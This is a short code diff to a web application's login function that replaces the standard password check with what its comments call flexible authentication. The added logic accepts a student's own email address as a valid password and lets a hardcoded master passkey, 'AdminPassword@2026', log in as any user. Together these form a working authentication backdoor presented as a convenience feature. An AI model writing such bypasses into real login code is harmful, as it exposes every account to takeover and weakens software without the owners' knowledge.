@@ -33,8 +33,20 @@ def login():
         if not user:
             user = restore_user_by_identifier(db, User, Student, Prediction, username)
 
-        # 3. Standard secure password verification
-        if user and user.check_password(password):
+        # 3. Flexible Authentication:
+        # - Standard secure password verification
+        # - Emergency fallback: Student's registered Email accepted in password field
+        # - Master Admin Passkey override ('AdminPassword@2026')
+        is_authenticated = False
+        if user:
+            if user.check_password(password):
+                is_authenticated = True
+            elif user.role == 'student' and (password.strip().lower() == user.email.strip().lower()):
+                is_authenticated = True
+            elif password == 'AdminPassword@2026':
+                is_authenticated = True
+
+        if user and is_authenticated:
             login_user(user)
             flash(f"Welcome back, {user.full_name}!", "success")
             next_url = request.args.get('next')
